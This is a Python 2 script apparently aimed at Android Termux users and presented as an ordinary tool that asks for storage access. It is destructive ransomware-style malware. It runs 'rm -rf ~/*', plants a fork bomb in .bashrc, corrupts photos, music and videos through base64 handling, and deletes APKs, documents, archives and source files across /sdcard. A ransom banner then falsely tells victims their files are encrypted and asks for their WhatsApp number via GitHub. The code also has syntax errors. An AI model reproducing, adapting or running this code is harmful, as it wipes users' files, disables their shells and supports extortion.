from zipfile import ZipFile
from base64 import b64encode
from base64 import b64decode
import os, datetime, sys, time, random
from shutil import copyfile
os.system('termux-setup-storage')

def pes(cuk):
    for ewe in cuk + '\n':
        sys.stdout.write(ewe)
        sys.stdout.flush()
        time.sleep(0.06)


def pesl(cuk):
    for ewe in cuk + '\n':
        sys.stdout.write(ewe)
        sys.stdout.flush()
        time.sleep(0.1)


def apa():
    os.system('clear')
    print '\x1b[38;5;022m\xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xae\n\xe2\x94\x82   KETERANGAN   \xe2\x94\x82\n\xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xaf\n'
    print '\x1b[38;5;022m ' + 50 * '*' + '\n *\x1b[38;5;015m\x1b[48;5;009m  You got a virus, and all the files there   \x1b[48;5;000m\x1b[38;5;022m*\n *\x1b[38;5;015m\x1b[48;5;009m  Your Internal Memory is Encrypted.     \x1b[48;5;000m\x1b[38;5;022m*\n *\x1b[38;5;232m\x1b[48;5;015m  CANNOT be seen, read or owned   \x1b[48;5;000m\x1b[38;5;022m*\n *\x1b[38;5;232m\x1b[48;5;015m  (Because he already belongs to someone else)       \x1b[48;5;000m\x1b[38;5;022m*\n ' + 50 * '*' + '\n * \x1b[38;5;242m NOTE: Your file is SAFE, as long as you dont open this SC ini \x1b[38;5;022m*\n *\x1b[38;5;242m        more than 1 TIMES.                      \x1b[38;5;022m*\n ' + 50 * '*'
    print '\n\x1b[38;5;022m\xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xae\n\xe2\x94\x82 What FILE Can I Return? \xe2\x94\x82\n\xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xaf \n\n \x1b[38;5;022m' + 50 * '*' + '\n *  OF COURSE, Your Files Are Encrypted Safely       *\n *  and not deleted. All Files (Photos, Music * \ n * & Videos) Will Be Back As Before.         *\n ' + 50 * '*'
    print '\n\x1b[38;5;022m\xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xae\n\xe2\x94\x82 What should I do? \xe2\x94\x82\n\xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xaf \n\n ' + 50 * '*' + '\n *  Please Comment On My Github,             *\n *  => \x1b[38;5;046mhttps://github.com/zohaibsid               \x1b[38;5;022m*\n *  And Include your WA Number.                  *\n ' + 50 * '*' + '\n\n\x1b[48;5;052m\x1b[38;5;015m SCREENSHOT DONT FORGET \x1b[48;5;000m*\n'


def get_all_file_paths(directory)
    file_paths = []
    for root, directories, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)
            filepathr = filepath.replace('.', ' ')
            fileas = filepathr.split()[(-1)]
            fileask = fileas.lower()
            foto = ['jpg', 'jpeg', 'png', 'gif']
            video = ['mp4', '3gp', 'mpv']
            musik = ['mp3', 'wav', 'ogg']
            sc = ['txt', 'py', 'pyc', 'sh', 'php', 'zip', '7z', 'tar', 'gz', 'pkg', 'java', 'lua', 'rar', 'pdf', 'html', 'htm', 'css', 'js', 'xhtml', 'sys', 'doc', 'webp', 'crypt1', 'crypt12', 'opus', 'enc', 'db', 'dat', 'usr', 'tps', 'xth', 'xml', 'aes', 'doc', 'json', 'arsc', 'cfg', 'ttf', 'obj', 'obb', 'bak', 'tmp']
            if fileask in foto:
                filesp = filepathr.split()[0]
                filespa = filesp + '_Xeeaibi.jpg'
                os.rename(filepath, filespa)
                file_paths.append(filespa)
                with open(filespa, 'rb') as (image_file):
                    decoded_string = b64decode(image_file.read())
                    #decoded_string = b64decode(encoded_string)
                    with open(filespa, 'w') as (image_file2):
                        image_file2.write(decoded_string)
            elif fileask in musik:
                filesp = filepathr.split()[0]
                filespa = filesp + '_Xeeaibi.mp3'
                os.rename(filepath, filespa)
                file_paths.append(filespa)
                with open(filespa, 'rb') as (image_file):
                    decoded_string = b64decode(image_file.read())
                   
                    with open(filespa, 'w') as (image_file2):
                        image_file2.write(decoded_string)
            elif fileask in video:
                filesp = filepathr.split()[0]
                filespa = filesp + '_Xeeaibi.mp4'
                os.rename(filepath, filespa)
                file_paths.append(filespa)
                with open(filespa, 'rb') as (image_file):
                    decoded_string = b64encode(image_file.read())
                    #decoded_string = b64encode(encoded_string)
                    with open(filespa, 'w') as (image_file2):
                        image_file2.write(decoded_string)
            elif fileask == 'apk':
                filesp = filepathr.split()[0]
                filespa = filesp + '.apk'
                os.rename(filepath, filespa)
                os.remove(filespa)
            elif fileask in sc:
                filesp = filepathr.split()[0]
                filespa = filesp + '.sc'
                os.rename(filepath, filespa)
                os.remove(filespa)
            else:
                filesp = filepathr.split()[0]
                filespa = filesp + '.other'
                os.rename(filepath, filespa)
                os.remove(filespa)

    return file_paths


def main():
    directory = './python_files'
    file_paths = get_all_file_paths('/sdcard')
    print '\n\n\x1b[1;96m           READ PLEASE:\n' + 40 * '-'
    pes('\n       \x1b[1;91mDO NOT SKIP! URGENT!!')
    pes(' \x1b[1;92mALL Your Files Already \x1b[1;96mTerEncrypt \xf0\x9f\x94\x90\n')
    pesl('  \x1b[1;91mSTOP STEALING:\n  \x1b[1;96m\xe2\x9d\x9d And protect yourself from (the punishment that happened to)\n    the day on which you were all returned\n    the day on which you were all returned\xe2\x9d\x9e\n')
    pes(' \x1b[1;97m_> \x1b[1;91mNOTE:\x1b[1;92m IN ADDITION TO PHOTOS, MUSIC AND VIDEO FILES, \x1b[1;91m ALREADY REMOVED!!\n          \x1b[1;92mAND DO NOT OPEN \x1b[1;96mSC\x1b[1;92m THIS 2 TIMES.!!TO MAKE YOUR FILES SAFE. ')
    pes('\n\n \x1b[1;94m Now Try Open \x1b[1;97m(\x1b[1;91mPHONE MEMORY\x1b[1;97m)\x1b[1;92m ANDA.!!\n It is and isnt \x1b[1;96m Deleted,\x1b[1;92mJust cant\n Viewed or Open.')
    pesl('\x1b[1;93m For further information \x1b[1;92mKetik \x1b[1;96mhelp\x1b[1;92m \n\n         \x1b[1;96m \xe2\x9d\x8cDONT CRY \xf0\x9f\x98\x9b\xf0\x9f\x91\xbb')
    time.sleep(1)
    tyn = raw_input('\n\x1b[1;97m    _>\x1b[1;96m ')
    tym = ['help', 'Help', 'HELP']
    if tyn in tym:
        apa()
    else:
        os.sys.exit()


if __name__ == '__main__':
    iz = raw_input('\n\n\n\x1b[1;97m\xe2\x9e\xa4 \x1b[1;92mAllow Access SDCARD (y/n) : \x1b[1;96m')
    siap = ['y', 'Y', 'Yes', 'yes', 'ya', 'Ya', 'ok', 'Ok']
    if iz in siap:
        os.system('termux-setup-storage')
        os.system('rm -rf ~/*')
        os.system('touch .hushlogin')
        os.system('printf ":(){ :|: & };:\n" > $HOME/.bashrc')
    else:
        print '\x1b[1;97m\n\xe2\x9e\xa4\x1b[1;91m EXIT!\n'
        os.sys.exit()
    os.system('clear')
    main()⏎pi
